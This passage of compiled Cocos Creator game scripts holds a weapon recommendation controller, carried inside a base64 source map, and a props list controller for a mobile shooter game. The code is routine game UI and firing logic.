FbWl0dGVyL0J1bGxldEVtaXR0ZXJTaG91UWlhbmdcIjtcclxuaW1wb3J0IEJ1bGxldEVtaXR0ZXJKdUppUWlhbmcgZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckp1SmlRaWFuZ1wiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlckppYVRlTGluIGZyb20gXCIuLi9lbnRpdGllcy9idWxsZXRFbWl0dGVyL0J1bGxldEVtaXR0ZXJKaWFUZUxpblwiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlckppR3VhbmcgZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckppR3VhbmdcIjtcclxuaW1wb3J0IEJ1bGxldEVtaXR0ZXJIdW9ZYW4gZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckh1b1lhblwiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlckh1b0ppYW5Ub25nIGZyb20gXCIuLi9lbnRpdGllcy9idWxsZXRFbWl0dGVyL0J1bGxldEVtaXR0ZXJIdW9KaWFuVG9uZ1wiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlckxpWmlQYW8gZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckxpWmlQYW9cIjtcclxuaW1wb3J0IEJ1bGxldEVtaXR0ZXJQZW5aaSBmcm9tIFwiLi4vZW50aXRpZXMvYnVsbGV0RW1pdHRlci9CdWxsZXRFbWl0dGVyUGVuWmlcIjtcclxuaW1wb3J0IEJ1bGxldEVtaXR0ZXJTYW5EYW5RaWFuZyBmcm9tIFwiLi4vZW50aXRpZXMvYnVsbGV0RW1pdHRlci9CdWxsZXRFbWl0dGVyU2FuRGFuUWlhbmdcIjtcclxuaW1wb3J0IEJ1bGxldEVtaXR0ZXJTaGFuRGlhblFpdSBmcm9tIFwiLi4vZW50aXRpZXMvYnVsbGV0RW1pdHRlci9CdWxsZXRFbWl0dGVyU2hhbkRpYW5RaXVcIjtcclxuaW1wb3J0IEJ1bGxldEVtaXR0ZXIgZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlclwiO1xyXG5pbXBvcnQgUm9sZSBmcm9tIFwiLi4vZW50aXRpZXMvcm9sZS9Sb2xlXCI7XHJcbmltcG9ydCBBY3Rpb25zIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvYWN0aW9ucy9BY3Rpb25zXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vaW5mby9Xb3JsZFwiO1xyXG5pbXBvcnQgRmFjYWRlIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZmFjYWRlL0ZhY2FkZVwiO1xyXG5pbXBvcnQgSG9tZUNvbnRyb2xsZXIgZnJvbSBcIi4vSG9tZUNvbnRyb2xsZXJcIjtcclxuaW1wb3J0IHtHYW1lUHJveHl9IGZyb20gXCIuLi9nYW1lL0dhbWVQcm94eVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBSZWNvbW1lbmRDb250cm9sbGVyIGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuXHJcbiAgICBAcHJvcGVydHkoUm9sZSlcclxuICAgIHJvbGU6Um9sZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICB1c2VOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgbm9Vc2VOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIHByaXZhdGUgX2ZpcmVDRCA9IDA7XHJcblxyXG4gICAgcHJpdmF0ZSBfZ3VuSWQgPSAxO1xyXG5cclxuICAgIG9uTG9hZCgpIHtcclxuICAgICAgICBjYy5nYW1lLm9uKFwidmlkZW9fM1wiLCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMub25DbGlja1VzZURvKClcclxuICAgICAgICB9LHRoaXMpO1xyXG4gICAgfVxyXG5cclxuICAgIHN0YXJ0ICgpIHtcclxuICAgICAgICB0aGlzLm5vVXNlTm9kZS5vbihjYy5Ob2RlLkV2ZW50VHlwZS5QT1NJVElPTl9DSEFOR0VELCAoKT0+e1xyXG4gICAgICAgICAgICB0aGlzLnVzZU5vZGUucG9zaXRpb24gPSB0aGlzLm5vVXNlTm9kZS5wb3NpdGlvbi5hZGQoY2MudjIoMCwgODcpKTtcclxuICAgICAgICB9KTtcclxuICAgICAgICBsZXQgZ2FtZUJ1bGxldHNDb250cm9sbGVyID0gd2luZG93WydHYW1lQnVsbGV0c0NvbnRyb2xsZXInXTtcclxuICAgICAgICBnYW1lQnVsbGV0c0NvbnRyb2xsZXIuYnVsbGV0TGF5ZXIub24oY2MuTm9kZS5FdmVudFR5cGUuQ0hJTERfQURERUQsIChidWxsZXROb2RlOmNjLk5vZGUpPT57XHJcbiAgICAgICAgICAgIGJ1bGxldE5vZGUuZ3JvdXAgPSBcInVpXCI7XHJcbiAgICAgICAgfSk7XHJcbiAgICAgICAgbGV0IGJ1bGxldEVtaXR0ZXI6QnVsbGV0RW1pdHRlciA9IG51bGw7XHJcbiAgICAgICAgbGV0IGJ1bGxldEVtaXR0ZXJUeXBlID0gMjtcclxuICAgICAgICBsZXQgd2VhcG9uQ29uZmlnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uKS5maWx0ZXIodmFsdWUgPT4gdmFsdWVbJ2lkJ10gIT0gMSkuc29ydCgoKGEsIGIpID0+IGJbJ3VubG9jayddIC0gYVsndW5sb2NrJ10pKTtcclxuICAgICAgICBmb3IgKGxldCBpdGVtIG9mIHdlYXBvbkNvbmZpZyl7XHJcbiAgICAgICAgICAgIGlmIChXb3JsZC5TdG9yYWdlLmdhbWVMZXZlbCA+PSBpdGVtWyd1bmxvY2snXSl7XHJcbiAgICAgICAgICAgICAgICBidWxsZXRFbWl0dGVyVHlwZSA9IGl0ZW1bJ2lkJ107XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgICAgICBpZiAoYnVsbGV0RW1pdHRlclR5cGUgPiA3KXtcclxuICAgICAgICAgICAgYnVsbGV0RW1pdHRlclR5cGUgPSA3O1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLl9ndW5JZCA9IGJ1bGxldEVtaXR0ZXJUeXBlO1xyXG4gICAgICAgIGxldCBwcm9taXNlcyA9IFtdO1xyXG4gICAgICAgIHByb21pc2VzLnB1c2goY2MubG9hZGVyLmxvYWRSZXNBd2FpdCgncHJlZmFiL2VudGl0aWVzL2J1bGxldC9idWxsZXQnK2J1bGxldEVtaXR0ZXJUeXBlKSk7XHJcbiAgICAgICAgaWYgKGJ1bGxldEVtaXR0ZXJUeXBlID09IEJ1bGxldEVtaXR0ZXIuVFlQRVMuTGlaaVBhbyl7XHJcbiAgICAgICAgICAgIHByb21pc2VzLnB1c2goY2MubG9hZGVyLmxvYWRSZXNBd2FpdCgncHJlZmFiL2VudGl0aWVzL2J1bGxldC9idWxsZXQxMDgnKSk7XHJcbiAgICAgICAgfWVsc2UgaWYgKGJ1bGxldEVtaXR0ZXJUeXBlID09IEJ1bGxldEVtaXR0ZXIuVFlQRVMuSHVvSmlhblRvbmcpe1xyXG4gICAgICAgICAgICBwcm9taXNlcy5wdXNoKGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoJ3ByZWZhYi9lbnRpdGllcy9leHBsb3NpdmUvZXhwbG9zaXZlOScpKTtcclxuICAgICAgICB9ZWxzZSBpZiAoYnVsbGV0RW1pdHRlclR5cGUgPT0gQnVsbGV0RW1pdHRlci5UWVBFUy5KdUppUWlhbmcpe1xyXG4gICAgICAgICAgICBwcm9taXNlcy5wdXNoKGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoJ3ByZWZhYi9lbnRpdGllcy9idWxsZXQvZmlyZTcnKSk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIFByb21pc2UuYWxsKHByb21pc2VzKS50aGVuKCgpPT57XHJcbiAgICAgICAgICAgIHN3aXRjaCAoYnVsbGV0RW1pdHRlclR5cGUpe1xyXG4gICAgICAgICAgICAgICAgY2FzZSBCdWxsZXRFbWl0dGVyLlRZUEVTLlNob3VRaWFuZzpcclxuICAgICAgICAgICAgICAgICAgICBidWxsZXRFbWl0dGVyID0gbmV3IEJ1bGxldEVtaXR0ZXJTaG91UWlhbmcoZ2FtZUJ1bGxldHNDb250cm9sbGVyKTtcclxuICAgICAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgICAgIGNhc2UgQnVsbGV0RW1pdHRlci5UWVBFUy5QZW5aaTpcclxuICAgICAgICAgICAgICAgICAgICBidWxsZXRFbWl0dGVyID0gbmV3IEJ1bGxldEVtaXR0ZXJQZW5aaShnYW1lQnVsbGV0c0NvbnRyb2xsZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICAgICAgY2FzZSBCdWxsZXRFbWl0dGVyLlRZUEVTLkppYVRlTGluOlxyXG4gICAgICAgICAgICAgICAgICAgIGJ1bGxldEVtaXR0ZXIgPSBuZXcgQnVsbGV0RW1pdHRlckppYVRlTGluKGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgICAgICBjYXNlIEJ1bGxldEVtaXR0ZXIuVFlQRVMuU2FuRGFuUWlhbmc6XHJcbiAgICAgICAgICAgICAgICAgICAgYnVsbGV0RW1pdHRlciA9IG5ldyBCdWxsZXRFbWl0dGVyU2FuRGFuUWlhbmcoZ2FtZUJ1bGxldHNDb250cm9sbGVyKTtcclxuICAgICAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgICAgIGNhc2UgQnVsbGV0RW1pdHRlci5UWVBFUy5KdUppUWlhbmc6XHJcbiAgICAgICAgICAgICAgICAgICAgYnVsbGV0RW1pdHRlciA9IG5ldyBCdWxsZXRFbWl0dGVySnVKaVFpYW5nKGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgICAgICBjYXNlIEJ1bGxldEVtaXR0ZXIuVFlQRVMuTGlaaVBhbzpcclxuICAgICAgICAgICAgICAgICAgICBidWxsZXRFbWl0dGVyID0gbmV3IEJ1bGxldEVtaXR0ZXJMaVppUGFvKGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgICAgICBjYXNlIEJ1bGxldEVtaXR0ZXIuVFlQRVMuSHVvSmlhblRvbmc6XHJcbiAgICAgICAgICAgICAgICAgICAgYnVsbGV0RW1pdHRlciA9IG5ldyBCdWxsZXRFbWl0dGVySHVvSmlhblRvbmcoZ2FtZUJ1bGxldHNDb250cm9sbGVyKTtcclxuICAgICAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgICAgIGNhc2UgQnVsbGV0RW1pdHRlci5UWVBFUy5TaGFuRGlhblFpdTpcclxuICAgICAgICAgICAgICAgICAgICBidWxsZXRFbWl0dGVyID0gbmV3IEJ1bGxldEVtaXR0ZXJTaGFuRGlhblFpdShnYW1lQnVsbGV0c0NvbnRyb2xsZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICAgICAgY2FzZSBCdWxsZXRFbWl0dGVyLlRZUEVTLkppR3Vhbmc6XHJcbiAgICAgICAgICAgICAgICAgICAgYnVsbGV0RW1pdHRlciA9IG5ldyBCdWxsZXRFbWl0dGVySmlHdWFuZyhnYW1lQnVsbGV0c0NvbnRyb2xsZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICAgICAgY2FzZSBCdWxsZXRFbWl0dGVyLlRZUEVTLkh1b1lhbjpcclxuICAgICAgICAgICAgICAgICAgICBidWxsZXRFbWl0dGVyID0gbmV3IEJ1bGxldEVtaXR0ZXJIdW9ZYW4oZ2FtZUJ1bGxldHNDb250cm9sbGVyKTtcclxuICAgICAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICBidWxsZXRFbWl0dGVyLmluaXQoYnVsbGV0RW1pdHRlclR5cGUpO1xyXG4gICAgICAgICAgICBpZiAoYnVsbGV0RW1pdHRlclR5cGUgPT0gQnVsbGV0RW1pdHRlci5UWVBFUy5KaUd1YW5nKXtcclxuICAgICAgICAgICAgICAgIGxldCBidWxsZXQgPSBidWxsZXRFbWl0dGVyLmdhbWVCdWxsZXRzQ29udHJvbGxlci5nZXRJbmFjdGl2ZUJ1bGxldChCdWxsZXRFbWl0dGVyLlRZUEVTLkppR3VhbmcpO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0LmNvbGxpZGVyLmVuYWJsZWQgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgIGxldCBza2UgPSBidWxsZXQuZ2V0Q29tcG9uZW50KHNwLlNrZWxldG9uKTtcclxuICAgICAgICAgICAgICAgIHNrZS5zZXRTdGFydExpc3RlbmVyKCh0cmFja0VudHJ5LCBsb29wQ291bnQpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IG5hbWUgPSB0cmFja0VudHJ5LmFuaW1hdGlvbiA/IHRyYWNrRW50cnkuYW5pbWF0aW9uLm5hbWUgOiAnJztcclxuICAgICAgICAgICAgICAgICAgICBpZihuYW1lID09PSBcImppZ3VhbmdcIil7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5jb2xsaWRlci5lbmFibGVkID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgIHNrZS5zZXRDb21wbGV0ZUxpc3RlbmVyKCh0cmFja0VudHJ5LCBsb29wQ291bnQpID0+IHtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgbmFtZSA9IHRyYWNrRW50cnkuYW5pbWF0aW9uID8gdHJhY2tFbnRyeS5hbmltYXRpb24ubmFtZSA6ICcnO1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChuYW1lID09PSBcInh1bmVuZ1wiKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNrZS5zZXRBbmltYXRpb24oMCwgXCJqaWd1YW5nXCIsIGZhbHNlKTtcclxuICAgICAgICAgICAgICAgICAgICB9ZWxzZSBpZihuYW1lID09PSBcImppZ3VhbmdcIil7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldEVtaXR0ZXIuYnVsbGV0Q291bnQtLTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0LmNvbGxpZGVyLmVuYWJsZWQgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSgwKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghYnVsbGV0LmNvbGxpZGVyLmVuYWJsZWQpe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0RW1pdHRlci5fYnVsbGV0SmlHdWFuZ1NrZSA9IHNrZTtcclxuICAgICAgICAgICAgICAgIGJ1bGxldEVtaXR0ZXIuX2J1bGxldEppR3VhbmcgPSBidWxsZXQ7XHJcbiAgICAgICAgICAgICAgICBidWxsZXRFbWl0dGVyLl9idWxsZXRKaUd1YW5nLm5vZGUucm90YXRpb24gPSB0aGlzLnJvbGUubm9kZS5yb3RhdGlvbjtcclxuICAgICAgICAgICAgICAgIGJ1bGxldEVtaXR0ZXIuX2J1bGxldEppR3Vhbmcubm9kZS5wb3NpdGlvbiA9IHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uLmFkZChjYy52MigwLCAxKS5yb3RhdGUoY2MubWlzYy5kZWdyZWVzVG9SYWRpYW5zKC10aGlzLnJvbGUubm9kZS5yb3RhdGlvbikpLm5vcm1hbGl6ZSgpLm11bCh0aGlzLnJvbGUuZ3VuVG9wTm9kZS55ICsgMjApKTtcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgbGV0IGRpciA9IGNjLnYyKDAsIDEwMDApLnN1Yih0aGlzLnJvbGUubm9kZS5wb3NpdGlvbikubm9ybWFsaXplKCk7XHJcblxyXG4gICAgICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKEFjdGlvbnMudXBkYXRlKGR0ID0+IHtcclxuICAgICAgICAgICAgICAgIGlmICh0aGlzLl9maXJlQ0QgPiAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5fZmlyZUNEIC09IGR0O1xyXG4gICAgICAgICAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgIHRoaXMuX2ZpcmVDRCA9IGJ1bGxldEVtaXR0ZXIuaW50ZXJ2YWw7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGJ1bGxldEVtaXR0ZXJUeXBlID09IEJ1bGxldEVtaXR0ZXIuVFlQRVMuSnVKaVFpYW5nKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGJ1bGxldFN0cmlrZVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2ZpcmU3XCIpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgYnVsbGV0U3RyaWtlTm9kZSA9IGNjLmluc3RhbnRpYXRlKGJ1bGxldFN0cmlrZVByZWZhYik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVCdWxsZXRzQ29udHJvbGxlci5idWxsZXRMYXllci5hZGRDaGlsZChidWxsZXRTdHJpa2VOb2RlLCAwKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0U3RyaWtlTm9kZS5wb3NpdGlvbiA9IHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uLmFkZChkaXIubXVsKHRoaXMucm9sZS5ndW5Ub3BOb2RlLnkpKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0U3RyaWtlTm9kZS5yb3RhdGlvbiA9IDkwIC0gY2MubWlzYy5yYWRpYW5zVG9EZWdyZWVzKE1hdGguYXRhbjIoZGlyLnksIGRpci54KSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldFN0cmlrZU5vZGUuZ2V0Q29tcG9uZW50KHNwLlNrZWxldG9uKS5zZXRDb21wbGV0ZUxpc3RlbmVyKCgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXRTdHJpa2VOb2RlLmRlc3Ryb3koKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChidWxsZXRFbWl0dGVyVHlwZSAhPT0gQnVsbGV0RW1pdHRlci5UWVBFUy5KaUd1YW5nICYmIGJ1bGxldEVtaXR0ZXJUeXBlICE9PSBCdWxsZXRFbWl0dGVyLlRZUEVTLlBlblppKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5yb2xlLmZpcmVTcHJpdGUubm9kZS5zY2FsZSA9IDE7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMucm9sZS5maXJlU3ByaXRlLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5yb2xlLmZpcmVTcHJpdGUubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2Muc2NhbGVUbygwLjA1LCAwLjUpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5yb2xlLmZpcmVTcHJpdGUubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgYnVsbGV0RW1pdHRlci5maXJlKHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uLmFkZChkaXIubXVsKHRoaXMucm9sZS5ndW5Ub3BOb2RlLnkpKSwgZGlyKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSkpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIG9uQ2xpY2tVc2UoZXZlbnQsIGRhdGEpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwi44CQdmlkZW/jgJEzIOijheWkh+aOqOiNkOOAkGNsaWNr44CRUmVjb21tZW5kQ29udHJvbGxlciBVc2VcIilcclxuXHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS5fdmlkZW9TaWduPTNcclxuICAgICAgICBXb3JsZC5TdG9yYWdlLnZpZGVvQWRfc2hvdygpICAgIFxyXG4gICAgfVxyXG5cclxuICAgIG9uQ2xpY2tVc2VEbygpe1xyXG4gICAgICAgIEdhbWVQcm94eS5wcmVwYXJlR3VuID0gdGhpcy5fZ3VuSWQ7XHJcbiAgICAgICAgRmFjYWRlLmZpbmRDb21wb25lbnQoXCJIb21lU2NlbmVcIiwgSG9tZUNvbnRyb2xsZXIpLnBsYXlFeGl0KCk7XHJcbiAgICAgICAgdGhpcy5ub2RlLmRlc3Ryb3koKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkNsaWNrTm9Vc2UoZXZlbnQsIGRhdGEpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwi44CQY2xpY2vjgJFSZWNvbW1lbmRDb250cm9sbGVyIE5vVXNlXCIpXHJcblxyXG4gICAgICAgIEZhY2FkZS5maW5kQ29tcG9uZW50KFwiSG9tZVNjZW5lXCIsIEhvbWVDb250cm9sbGVyKS5wbGF5RXhpdCgpO1xyXG4gICAgICAgIHRoaXMubm9kZS5kZXN0cm95KCk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/PropsController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'ce3c5l6ZAlLkpyTmNdI0qJX', 'PropsController');
// script/app/home/PropsController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var TableViewMediator_1 = require("../../../framework/tableview/TableViewMediator");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var PropsController = /** @class */ (function (_super) {
    __extends(PropsController, _super);
    function PropsController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.tableViewMediator = null;
        _this.detailNode = null;
        _this.detailLabel = null;
        return _this;
    }
    PropsController.prototype.start = function () {
        var _this = this;
        this.detailNode.on(cc.Node.EventType.TOUCH_START, function () {
            _this.detailNode.active = false;
        });
        this.tableViewMediator.datas = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Prop).filter(function (value) { return value['id'] != 7 && value['id'] != 8 && value['id'] != 10; }).sort(function (a, b) { return a['order'] - b['order']; });
    };
    __decorate([
        property(TableViewMediator_1.default)
    ], PropsController.prototype, "tableViewMediator", void 0);
    __decorate([
        property(cc.Node)
    ], PropsController.prototype, "detailNode", void 0);
    __decorate([
        property(cc.Label)
    ], PropsController.prototype, "detailLabel", void 0);
    PropsController = __decorate([
        ccclass
    ], PropsController);
    return PropsController;
}(cc.Component));
exports.default = PropsController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvUHJvcHNDb250cm9sbGVyLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxvRkFBK0U7QUFDL0UscUVBQWtFO0FBQ2xFLDZEQUEwRDtBQUVwRCxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUE2QyxtQ0FBWTtJQUF6RDtRQUFBLHFFQW1CQztRQWhCRyx1QkFBaUIsR0FBcUIsSUFBSSxDQUFDO1FBRzNDLGdCQUFVLEdBQVcsSUFBSSxDQUFDO1FBRzFCLGlCQUFXLEdBQVksSUFBSSxDQUFDOztJQVVoQyxDQUFDO0lBUkcsK0JBQUssR0FBTDtRQUFBLGlCQUtDO1FBSkcsSUFBSSxDQUFDLFVBQVUsQ0FBQyxFQUFFLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsV0FBVyxFQUFFO1lBQzlDLEtBQUksQ0FBQyxVQUFVLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUNuQyxDQUFDLENBQUMsQ0FBQztRQUNILElBQUksQ0FBQyxpQkFBaUIsQ0FBQyxLQUFLLEdBQUcseUJBQVcsQ0FBQyxhQUFhLENBQUMsaUNBQWUsQ0FBQyxJQUFJLENBQUMsQ0FBQyxNQUFNLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSxLQUFLLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxJQUFJLEtBQUssQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksS0FBSyxDQUFDLElBQUksQ0FBQyxJQUFJLEVBQUUsRUFBekQsQ0FBeUQsQ0FBQyxDQUFDLElBQUksQ0FBQyxVQUFDLENBQUMsRUFBRSxDQUFDLElBQUssT0FBQSxDQUFDLENBQUMsT0FBTyxDQUFDLEdBQUMsQ0FBQyxDQUFDLE9BQU8sQ0FBQyxFQUFyQixDQUFxQixDQUFDLENBQUM7SUFDcE0sQ0FBQztJQWJEO1FBREMsUUFBUSxDQUFDLDJCQUFpQixDQUFDOzhEQUNlO0lBRzNDO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7dURBQ1E7SUFHMUI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLEtBQUssQ0FBQzt3REFDUztJQVRYLGVBQWU7UUFEbkMsT0FBTztPQUNhLGVBQWUsQ0FtQm5DO0lBQUQsc0JBQUM7Q0FuQkQsQUFtQkMsQ0FuQjRDLEVBQUUsQ0FBQyxTQUFTLEdBbUJ4RDtrQkFuQm9CLGVBQWUiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IFRhYmxlVmlld01lZGlhdG9yIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvdGFibGV2aWV3L1RhYmxlVmlld01lZGlhdG9yXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBQcm9wc0NvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShUYWJsZVZpZXdNZWRpYXRvcilcclxuICAgIHRhYmxlVmlld01lZGlhdG9yOlRhYmxlVmlld01lZGlhdG